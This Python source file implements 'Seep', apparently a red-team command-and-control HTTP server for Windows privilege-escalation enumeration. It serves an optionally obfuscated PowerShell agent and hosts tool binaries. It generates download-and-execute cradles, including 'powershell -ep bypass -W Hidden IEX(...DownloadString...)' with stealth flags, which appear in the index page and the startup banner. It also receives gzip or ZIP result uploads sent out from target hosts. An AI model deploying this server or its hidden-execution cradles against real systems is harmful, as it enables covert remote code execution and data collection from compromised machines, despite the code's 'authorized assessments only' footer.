"""Seep unified HTTP server."""

from __future__ import annotations

import gzip
import hmac
import html as _html_mod
import json
import re
import socket
import sys
import threading
import zipfile
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from io import BytesIO
from pathlib import Path
from urllib.parse import parse_qs, urlparse

from server.agent.composer import AgentComposer
from server.config import ServerConfig

# ANSI colour helpers
_RESET = "\033[0m"
_BOLD = "\033[1m"
_GREEN = "\033[32m"
_CYAN = "\033[36m"
_YELLOW = "\033[33m"
_RED = "\033[31m"
_MAGENTA = "\033[35m"
_DIM = "\033[2m"

_MAX_UPLOAD_BYTES = 50 * 1024 * 1024  # 50 MB
_MAX_DECOMPRESSED_BYTES = 200 * 1024 * 1024  # 200 MB


def _color(colour: str, text: str) -> str:
    return f"{colour}{text}{_RESET}"


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------


def get_local_ips() -> list[str]:
    """Return local IPs, preferring tun/tap interfaces then eth, then others."""
    import fcntl
    import struct
    import array

    preferred_prefixes = ("tun", "tap", "eth", "ens", "enp", "wlan")
    ips: dict[str, str] = {}  # iface -> ip

    try:
        # SIOCGIFCONF — enumerate all interfaces
        SIOCGIFCONF = 0x8912
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            buf = array.array("B", b"\0" * 4096)
            ifconf = struct.pack("iL", buf.buffer_info()[1], buf.buffer_info()[0])
            res = fcntl.ioctl(s.fileno(), SIOCGIFCONF, ifconf)
            length = struct.unpack("i", res[:4])[0]
            data = bytes(buf)[:length]
            offset = 0
            while offset < length:
                iface = (
                    data[offset : offset + 16]
                    .rstrip(b"\x00")
                    .decode("utf-8", errors="ignore")
                    .strip("\x00")
                )
                raw_ip = data[offset + 20 : offset + 24]
                try:
                    ip = socket.inet_ntoa(raw_ip)
                    if ip and not ip.startswith("127."):
                        ips[iface] = ip
                except Exception:
                    pass
                offset += 40
    except Exception:
        pass

    if not ips:
        # Fallback: connect UDP and grab local IP
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                return [s.getsockname()[0]]
        except Exception:
            return ["127.0.0.1"]

    def sort_key(item: tuple[str, str]) -> int:
        iface = item[0]
        for rank, prefix in enumerate(preferred_prefixes):
            if iface.startswith(prefix):
                return rank
        return len(preferred_prefixes)

    ordered = [ip for _, ip in sorted(ips.items(), key=sort_key)]
    return ordered if ordered else ["127.0.0.1"]


# ---------------------------------------------------------------------------
# HTML index page
# ---------------------------------------------------------------------------

_INDEX_HTML = """\
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Seep C2</title>
<style>
  :root {{
    --bg: #0d1117;
    --surface: #161b22;
    --border: #30363d;
    --accent: #58a6ff;
    --green: #3fb950;
    --yellow: #d29922;
    --red: #f85149;
    --text: #c9d1d9;
    --muted: #8b949e;
    --code-bg: #1c2128;
  }}
  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{ background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, sans-serif; font-size: 14px; line-height: 1.6; }}
  a {{ color: var(--accent); text-decoration: none; }}
  a:hover {{ text-decoration: underline; }}
  header {{ background: var(--surface); border-bottom: 1px solid var(--border); padding: 16px 32px; display: flex; align-items: center; gap: 12px; }}
  header h1 {{ font-size: 20px; font-weight: 700; letter-spacing: 1px; color: var(--accent); }}
  header .badge {{ background: var(--accent); color: #0d1117; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: 600; }}
  .container {{ max-width: 1100px; margin: 0 auto; padding: 24px 32px; }}
  .grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px; }}
  .card {{ background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 20px; }}
  .card h2 {{ font-size: 13px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; color: var(--muted); margin-bottom: 12px; padding-bottom: 8px; border-bottom: 1px solid var(--border); }}
  .stat-row {{ display: flex; gap: 20px; margin: 16px 0; }}
  .stat {{ background: var(--code-bg); border-radius: 6px; padding: 12px 16px; flex: 1; }}
  .stat .label {{ font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.5px; }}
  .stat .value {{ font-size: 22px; font-weight: 700; color: var(--accent); margin-top: 2px; }}
  pre, code {{ font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace; font-size: 12px; }}
  pre {{ background: var(--code-bg); border: 1px solid var(--border); border-radius: 6px; padding: 12px 14px; overflow-x: auto; margin: 6px 0; white-space: pre-wrap; word-break: break-all; }}
  .cradle-label {{ font-size: 11px; color: var(--muted); margin-top: 10px; margin-bottom: 2px; }}
  .pill {{ display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: 600; margin: 2px; }}
  .pill-green {{ background: rgba(63,185,80,.15); color: var(--green); border: 1px solid rgba(63,185,80,.3); }}
  .pill-blue {{ background: rgba(88,166,255,.12); color: var(--accent); border: 1px solid rgba(88,166,255,.3); }}
  .pill-yellow {{ background: rgba(210,153,34,.15); color: var(--yellow); border: 1px solid rgba(210,153,34,.3); }}
  table {{ width: 100%; border-collapse: collapse; font-size: 12px; }}
  th {{ text-align: left; padding: 6px 10px; border-bottom: 1px solid var(--border); color: var(--muted); font-weight: 600; text-transform: uppercase; font-size: 11px; }}
  td {{ padding: 8px 10px; border-bottom: 1px solid rgba(48,54,61,.5); }}
  tr:hover td {{ background: rgba(88,166,255,.04); }}
  .link-list a {{ display: block; padding: 6px 0; border-bottom: 1px solid rgba(48,54,61,.4); color: var(--accent); }}
  .link-list a:last-child {{ border-bottom: none; }}
  .full-width {{ grid-column: 1 / -1; }}
  footer {{ text-align: center; padding: 20px; color: var(--muted); font-size: 11px; border-top: 1px solid var(--border); margin-top: 32px; }}
</style>
</head>
<body>
<header>
  <h1>&#x25C8; SEEP</h1>
  <span class="badge">C2</span>
  <span style="margin-left:auto;color:var(--muted);font-size:12px;">Windows PrivEsc Enumeration Framework</span>
</header>

<div class="container">

  <div class="stat-row">
    <div class="stat">
      <div class="label">Server IP</div>
      <div class="value" style="font-size:16px;">{primary_ip}</div>
    </div>
    <div class="stat">
      <div class="label">HTTP Port</div>
      <div class="value">{http_port}</div>
    </div>
    <div class="stat">
      <div class="label">Results Received</div>
      <div class="value">{results_count}</div>
    </div>
    <div class="stat">
      <div class="label">Checks Available</div>
      <div class="value">{checks_count}</div>
    </div>
    <div class="stat">
      <div class="label">Tools Available</div>
      <div class="value">{tools_count}</div>
    </div>
  </div>

  <div class="grid">

    <div class="card full-width">
      <h2>Download Cradles</h2>
      <p class="cradle-label">[1] IEX via WebClient (most compatible)</p>
      <pre>{cradle_iex}</pre>
      <p class="cradle-label">[2] IEX with stealth flags (-NoProfile -WindowStyle Hidden)</p>
      <pre>{cradle_iex_hidden}</pre>
      <p class="cradle-label">[3] IEX via Invoke-WebRequest (iwr)</p>
      <pre>{cradle_iwr}</pre>
    </div>

    <div class="card">
      <h2>Endpoints</h2>
      <div class="link-list">
        <a href="/agent.ps1">/agent.ps1 &mdash; Composed agent (GET)</a>
        <a href="/cradle">/cradle &mdash; Plaintext download cradles (GET)</a>
        <a href="/api/results">/api/results &mdash; Results list JSON (GET)</a>
        <a href="/tools/">/tools/ &mdash; Tool files (GET)</a>
      </div>
      <br>
      <p style="font-size:12px;color:var(--muted);">POST /api/results or /upload to receive JSON or ZIP results.</p>
    </div>

    <div class="card">
      <h2>Agent Query Params</h2>
      <table>
        <tr><th>Param</th><th>Example</th><th>Effect</th></tr>
        <tr><td><code>checks</code></td><td><code>?checks=system_info,network</code></td><td>Include only listed check IDs</td></tr>
        <tr><td><code>exclude</code></td><td><code>?exclude=patches</code></td><td>Exclude listed check IDs</td></tr>
      </table>
    </div>

    <div class="card">
      <h2>Available Checks</h2>
      {checks_table}
    </div>

    <div class="card">
      <h2>Recent Results</h2>
      {results_table}
    </div>

  </div>
</div>

<footer>Seep &mdash; authorized security assessments only &mdash; {timestamp}</footer>
</body>
</html>
"""


# ---------------------------------------------------------------------------
# Request handler
# ---------------------------------------------------------------------------


class SeepHTTPHandler(BaseHTTPRequestHandler):
    """Unified HTTP handler — agent delivery, tool serving, result upload."""

    config: ServerConfig
    composer: AgentComposer
    _agent_cache: str | None = None
    _agent_cache_lock: threading.Lock = threading.Lock()

    # ------------------------------------------------------------------
    # Logging
    # ------------------------------------------------------------------

    def log_message(self, fmt: str, *args: object) -> None:
        method = self.command or "?"
        path = self.path or "/"

        method_colour = {
            "GET": _GREEN,
            "POST": _YELLOW,
            "PUT": _CYAN,
            "DELETE": _RED,
        }.get(method, _DIM)

        ts = datetime.now().strftime("%H:%M:%S")
        code = args[1] if len(args) > 1 else "???"

        code_str = str(code)
        if code_str.startswith("2"):
            code_colour = _GREEN
        elif code_str.startswith("4"):
            code_colour = _YELLOW
        elif code_str.startswith("5"):
            code_colour = _RED
        else:
            code_colour = _DIM

        client_ip = self.client_address[0] if self.client_address else "?"
        print(
            f"{_DIM}{ts}{_RESET} "
            f"{_color(method_colour, f'{method:<6}')}"
            f"{_color(_CYAN, path)}"
            f"  {_color(code_colour, code_str)}"
            f"  {_DIM}{client_ip}{_RESET}"
        )

    def log_error(self, fmt: str, *args: object) -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        msg = fmt % args if args else fmt
        print(f"{_DIM}{ts}{_RESET} {_RED}ERROR{_RESET} {msg}", file=sys.stderr)

    # ------------------------------------------------------------------
    # Routing
    # ------------------------------------------------------------------

    def do_GET(self) -> None:
        parsed = urlparse(self.path)
        clean = parsed.path.rstrip("/") or "/"

        if clean in ("", "/", "/index", "/index.html"):
            self._serve_index()
        elif clean.startswith("/agent") or clean in ("/Seep.ps1", "/agent.ps1"):
            self._serve_agent(parsed)
        elif clean == "/cradle":
            self._serve_cradle()
        elif clean.startswith("/tools"):
            self._serve_tool(parsed.path)
        elif clean == "/api/results":
            self._serve_results_list()
        else:
            self.send_error(404, "Not found")

    def do_POST(self) -> None:
        parsed = urlparse(self.path)
        clean = parsed.path.rstrip("/")

        if clean in ("/api/results", "/upload"):
            self._receive_results()
        else:
            self.send_error(404, "Not found")

    # ------------------------------------------------------------------
    # Security headers
    # ------------------------------------------------------------------

    def _add_security_headers(self) -> None:
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("X-Frame-Options", "DENY")
        self.send_header("Cache-Control", "no-store")
        self.send_header(
            "Content-Security-Policy", "default-src 'none'; style-src 'unsafe-inline'"
        )

    # ------------------------------------------------------------------
    # GET handlers
    # ------------------------------------------------------------------

    def _serve_index(self) -> None:
        ips = get_local_ips()
        primary_ip = ips[0] if ips else "127.0.0.1"
        scheme = "https" if self.config.tls.enabled else "http"
        base_url = f"{scheme}://{primary_ip}:{self.config.http_port}"

        # Quick IEX cradles (inline — don't call full compose_cradle)
        agent_url = f"{base_url}/agent.ps1"
        token_arg = f" -Token {self.config.auth_token}" if self.config.auth_token else ""
        cradle_iex = (
            f"powershell -ep bypass -c "
            f"\"IEX(New-Object Net.WebClient).DownloadString('{agent_url}'); Invoke-Seep{token_arg}\""
        )
        cradle_iex_hidden = (
            f"powershell -ep bypass -NoP -W Hidden -c "
            f"\"IEX(New-Object Net.WebClient).DownloadString('{agent_url}'); Invoke-Seep{token_arg}\""
        )
        cradle_iwr = (
            f"powershell -ep bypass -c "
            f"\"iex((iwr '{agent_url}' -UseBasicParsing).Content); Invoke-Seep{token_arg}\""
        )

        # Checks table
        checks = self.composer.list_checks()
        if checks:
            rows = "".join(
                f"<tr><td><code>{_html_escape(c.check_id)}</code></td>"
                f"<td>{_html_escape(c.check_name)}</td>"
                f"<td><span class='pill pill-{'green' if c.opsec_impact == 'low' else 'yellow' if c.opsec_impact == 'medium' else 'red'}'>"
                f"{_html_escape(c.opsec_impact)}</span></td></tr>"
                for c in checks
            )
            checks_table = (
                "<table><tr><th>ID</th><th>Name</th><th>Opsec</th></tr>"
                + rows
                + "</table>"
            )
        else:
            checks_table = "<p style='color:var(--muted)'>No checks found.</p>"

        # Results table
        results_dir = self.config.workdir / self.config.results.output_dir
        result_entries = self._list_results(results_dir)
        if result_entries:
            rows = "".join(
                f"<tr><td>{_html_escape(str(e.get('hostname', '?')))}</td>"
                f"<td>{_html_escape(str(e.get('timestamp', '?')))}</td>"
                f"<td>{_html_escape(str(e.get('findings_count', '?')))}</td>"
                f"<td><a href='/api/results'>{_html_escape(str(e.get('filename', '')))}</a></td></tr>"
                for e in result_entries[:10]
            )
            results_table = (
                "<table><tr><th>Host</th><th>When</th><th>Findings</th><th>File</th></tr>"
                + rows
                + "</table>"
            )
        else:
            results_table = "<p style='color:var(--muted)'>No results received yet.</p>"

        # Tool count
        tools_dir = self.config.workdir / self.config.catalog.tools_dir
        tools_count = 0
        if tools_dir.exists():
            flat = tools_dir / "all"
            if flat.exists():
                tools_count = sum(1 for _ in flat.iterdir())
            else:
                tools_count = sum(1 for _ in tools_dir.rglob("*") if _.is_file())

        html = _INDEX_HTML.format(
            primary_ip=_html_escape(primary_ip),
            http_port=self.config.http_port,
            results_count=len(result_entries),
            checks_count=len(checks),
            tools_count=tools_count,
            cradle_iex=_html_escape(cradle_iex),
            cradle_iex_hidden=_html_escape(cradle_iex_hidden),
            cradle_iwr=_html_escape(cradle_iwr),
            checks_table=checks_table,
            results_table=results_table,
            timestamp=_html_escape(datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
        )

        body = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self._add_security_headers()
        self.end_headers()
        self.wfile.write(body)

    def _serve_agent(self, parsed) -> None:
        # Parse query params: ?checks=a,b&exclude=c,d
        params = parse_qs(parsed.query)
        checks_param = params.get("checks", [None])[0]
        exclude_param = params.get("exclude", [None])[0]

        checks_list = (
            [c.strip() for c in checks_param.split(",")] if checks_param else None
        )
        exclude_list = (
            [e.strip() for e in exclude_param.split(",")] if exclude_param else None
        )

        custom = checks_list is not None or exclude_list is not None

        with self.__class__._agent_cache_lock:
            if custom or self.__class__._agent_cache is None:
                content = self.composer.compose(
                    checks=checks_list,
                    exclude=exclude_list,
                    obfuscate=self.config.agent.obfuscate,
                    strip_comments=self.config.agent.strip_comments,
                    auth_token=self.config.auth_token,
                )
                if not custom:
                    self.__class__._agent_cache = content
            else:
                content = self.__class__._agent_cache

        body = content.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Disposition", 'inline; filename="Seep.ps1"')
        self.send_header("Content-Length", str(len(body)))
        self._add_security_headers()
        self.end_headers()
        self.wfile.write(body)

    def _serve_cradle(self) -> None:
        ips = get_local_ips()
        primary_ip = ips[0] if ips else "127.0.0.1"
        scheme = "https" if self.config.tls.enabled else "http"
        server_url = f"{scheme}://{primary_ip}:{self.config.http_port}"

        text = self.composer.compose_cradle(
            server_url, auth_token=self.config.auth_token
        )
        body = text.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self._add_security_headers()
        self.end_headers()
        self.wfile.write(body)

    def _serve_tool(self, url_path: str) -> None:
        # Strip leading /tools/ prefix
        rel = url_path.lstrip("/")
        if rel.startswith("tools/"):
            rel = rel[len("tools/") :]

        tools_dir = self.config.workdir / self.config.catalog.tools_dir
        candidate = (tools_dir / rel).resolve()

        # Safety: must be inside tools_dir
        try:
            candidate.relative_to(tools_dir.resolve())
        except ValueError:
            self.send_error(403, "Forbidden")
            return

        if not candidate.exists() or not candidate.is_file():
            self.send_error(404, "Tool not found")
            return

        suffix = candidate.suffix.lower()
        if suffix in (".exe", ".dll", ".bin"):
            content_type = "application/octet-stream"
        elif suffix in (".ps1", ".py", ".sh", ".txt", ".md"):
            content_type = "text/plain; charset=utf-8"
        elif suffix == ".zip":
            content_type = "application/zip"
        else:
            content_type = "application/octet-stream"

        file_size = candidate.stat().st_size
        safe_name = re.sub(r"[^a-zA-Z0-9._-]", "_", candidate.name)
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(file_size))
        self.send_header("Content-Disposition", f'attachment; filename="{safe_name}"')
        self._add_security_headers()
        self.end_headers()
        with open(candidate, "rb") as f:
            while True:
                chunk = f.read(65536)
                if not chunk:
                    break
                self.wfile.write(chunk)

    def _serve_results_list(self) -> None:
        results_dir = self.config.workdir / self.config.results.output_dir
        entries = self._list_results(results_dir)
        body = json.dumps(entries, indent=2).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self._add_security_headers()
        self.end_headers()
        self.wfile.write(body)

    # ------------------------------------------------------------------
    # POST handlers
    # ------------------------------------------------------------------

    def _receive_results(self) -> None:
        # Authenticate upload if a token is configured
        if self.config.auth_token:
            token = self.headers.get("X-Seep-Token", "")
            if not hmac.compare_digest(token, self.config.auth_token):
                self._json_response(401, {"error": "Unauthorized"})
                return

        try:
            length = int(self.headers.get("Content-Length", 0))
        except ValueError:
            self._json_response(
                400, {"status": "error", "message": "Invalid Content-Length"}
            )
            return

        if length <= 0:
            self._json_response(400, {"status": "error", "message": "Empty body"})
            return

        if length > _MAX_UPLOAD_BYTES:
            self._json_response(413, {"status": "error", "message": "Upload too large"})
            return

        raw = self.rfile.read(length)

        # Detect encoding: GZip (from fileless agent) or ZIP
        if raw[:2] == b"\x1f\x8b":
            try:
                buf = BytesIO(raw)
                chunks = []
                total = 0
                with gzip.GzipFile(fileobj=buf) as gz:
                    while True:
                        chunk = gz.read(65536)
                        if not chunk:
                            break
                        total += len(chunk)
                        if total > _MAX_DECOMPRESSED_BYTES:
                            self._json_response(
                                413,
                                {
                                    "status": "error",
                                    "message": "Decompressed payload too large",
                                },
                            )
                            return
                        chunks.append(chunk)
                json_data = b"".join(chunks)
            except OSError:
                self._json_response(
                    400, {"status": "error", "message": "Invalid gzip data"}
                )
                return
        elif raw[:4] == b"PK\x03\x04":
            json_data = self._extract_json_from_zip(raw)
            if json_data is None:
                self._json_response(
                    400, {"status": "error", "message": "No results.json in ZIP"}
                )
                return
        else:
            json_data = raw

        # Parse JSON to extract metadata
        hostname = "unknown"
        findings_count = 0
        try:
            parsed = json.loads(json_data.decode("utf-8", errors="replace"))
            meta = parsed.get("meta", parsed.get("metadata", {}))
            hostname = meta.get("hostname", meta.get("computer_name", "unknown"))
            findings = parsed.get("findings", parsed.get("results", []))
            if isinstance(findings, list):
                findings_count = len(findings)
            elif isinstance(findings, dict):
                findings_count = sum(
                    len(v) if isinstance(v, list) else 1 for v in findings.values()
                )
        except (json.JSONDecodeError, AttributeError):
            pass

        # Sanitise hostname for use in filename
        safe_host = "".join(c if c.isalnum() or c in "-_" else "_" for c in hostname)[
            :32
        ]
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"results_{ts}_{safe_host}.json"

        results_dir = self.config.workdir / self.config.results.output_dir
        results_dir.mkdir(parents=True, exist_ok=True)
        out_path = results_dir / filename
        out_path.write_bytes(json_data)

        print(
            f"\n{_color(_GREEN, '[+] Results received')}"
            f"  host={_color(_CYAN, hostname)}"
            f"  findings={_color(_YELLOW, str(findings_count))}"
            f"  file={_color(_DIM, filename)}\n"
        )

        self._json_response(
            200,
            {
                "status": "ok",
                "filename": filename,
                "hostname": hostname,
                "findings_count": findings_count,
            },
        )

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _extract_json_from_zip(self, raw: bytes) -> bytes | None:
        """Extract results.json from a ZIP payload."""
        try:
            with zipfile.ZipFile(BytesIO(raw)) as zf:
                # Prefer explicit results.json, else first .json found
                names = zf.namelist()
                target = None
                for name in names:
                    if (
                        name.lower().endswith("results.json")
                        or name.lower() == "results.json"
                    ):
                        target = name
                        break
                if target is None:
                    target = next(
                        (n for n in names if n.lower().endswith(".json")), None
                    )
                if target is None:
                    return None
                with zf.open(target) as entry_file:
                    chunks = []
                    total = 0
                    while True:
                        chunk = entry_file.read(65536)
                        if not chunk:
                            break
                        total += len(chunk)
                        if total > _MAX_DECOMPRESSED_BYTES:
                            return None
                        chunks.append(chunk)
                return b"".join(chunks)
        except zipfile.BadZipFile:
            return None

    def _list_results(self, results_dir: Path) -> list[dict]:
        """Return a list of result metadata dicts from the results directory."""
        if not results_dir.exists():
            return []

        entries = []
        for jf in sorted(results_dir.glob("results_*.json"), reverse=True)[:50]:
            entry: dict = {
                "filename": jf.name,
                "timestamp": "",
                "hostname": "unknown",
                "findings_count": 0,
            }
            try:
                data = json.loads(jf.read_text(encoding="utf-8", errors="replace"))
                meta = data.get("meta", data.get("metadata", {}))
                entry["hostname"] = meta.get(
                    "hostname", meta.get("computer_name", "unknown")
                )
                findings = data.get("findings", data.get("results", []))
                if isinstance(findings, list):
                    entry["findings_count"] = len(findings)
                elif isinstance(findings, dict):
                    entry["findings_count"] = sum(
                        len(v) if isinstance(v, list) else 1 for v in findings.values()
                    )
                # Extract timestamp from filename: results_YYYYMMDD_HHMMSS_host.json
                parts = jf.stem.split("_")
                if len(parts) >= 3:
                    try:
                        dt = datetime.strptime(
                            f"{parts[1]}_{parts[2]}", "%Y%m%d_%H%M%S"
                        )
                        entry["timestamp"] = dt.strftime("%Y-%m-%d %H:%M:%S")
                    except ValueError:
                        entry["timestamp"] = datetime.fromtimestamp(
                            jf.stat().st_mtime
                        ).strftime("%Y-%m-%d %H:%M:%S")
            except (json.JSONDecodeError, OSError):
                pass
            entries.append(entry)

        return entries

    def _json_response(self, code: int, payload: dict) -> None:
        body = json.dumps(payload).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self._add_security_headers()
        self.end_headers()
        self.wfile.write(body)


# ---------------------------------------------------------------------------
# HTML escape helper
# ---------------------------------------------------------------------------


def _html_escape(text: str) -> str:
    return _html_mod.escape(str(text), quote=True)


# ---------------------------------------------------------------------------
# Factory + server startup
# ---------------------------------------------------------------------------


def create_handler(config: ServerConfig, composer: AgentComposer) -> type:
    """Return a handler class with config and composer injected as class attributes."""

    class _Handler(SeepHTTPHandler):
        pass

    _Handler.config = config
    _Handler.composer = composer
    _Handler._agent_cache = None
    _Handler._agent_cache_lock = threading.Lock()
    return _Handler


def _print_banner(config: ServerConfig, ips: list[str]) -> None:
    scheme = "https" if config.tls.enabled else "http"
    primary = ips[0] if ips else "0.0.0.0"

    print()
    print(_color(_CYAN, "  ╔══════════════════════════════════════════╗"))
    print(
        _color(_CYAN, "  ║")
        + _color(_BOLD, "   SEEP  C2 Server")
        + _color(_CYAN, "                          ║")
    )
    print(_color(_CYAN, "  ╚══════════════════════════════════════════╝"))
    print()
    print(f"  {_color(_DIM, 'Port      ')} {_color(_YELLOW, str(config.http_port))}")
    print(f"  {_color(_DIM, 'TLS       ')} {'yes' if config.tls.enabled else 'no'}")
    print(f"  {_color(_DIM, 'Bind      ')} {config.bind_address}")
    if config.auth_token:
        masked = config.auth_token[:8] + "*" * (len(config.auth_token) - 8)
        print(f"  {_color(_DIM, 'Auth Token')} {_color(_MAGENTA, masked)}")
    print()
    print(f"  {_color(_DIM, 'Interfaces:')}")
    for ip in ips:
        url = f"{scheme}://{ip}:{config.http_port}"
        print(f"    {_color(_GREEN, url)}")
    print()
    print(f"  {_color(_DIM, 'Cradle (IEX):')}")
    agent_url = f"{scheme}://{primary}:{config.http_port}/agent.ps1"
    token_arg = f" -Token {config.auth_token}" if config.auth_token else ""
    iex = (
        f"powershell -ep bypass -c "
        f"\"IEX(New-Object Net.WebClient).DownloadString('{agent_url}'); Invoke-Seep{token_arg}\""
    )
    print(f"    {_color(_CYAN, iex)}")
    print()
    print(
        f"  {_color(_DIM, 'Full cradles:')} {scheme}://{primary}:{config.http_port}/cradle"
    )
    print()
    print(_color(_DIM, "  Press Ctrl+C to stop"))
    print()


def start_server(config: ServerConfig) -> None:
    """Start the Seep HTTP server (blocking)."""
    composer = AgentComposer()
    handler_class = create_handler(config, composer)

    server = HTTPServer((config.bind_address, config.http_port), handler_class)

    if config.tls.enabled:
        from server.http.tls import wrap_server_tls

        server = wrap_server_tls(server, config)

    ips = get_local_ips()
    _print_banner(config, ips)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{_color(_YELLOW, '[*] Server stopped')}")
        server.server_close()
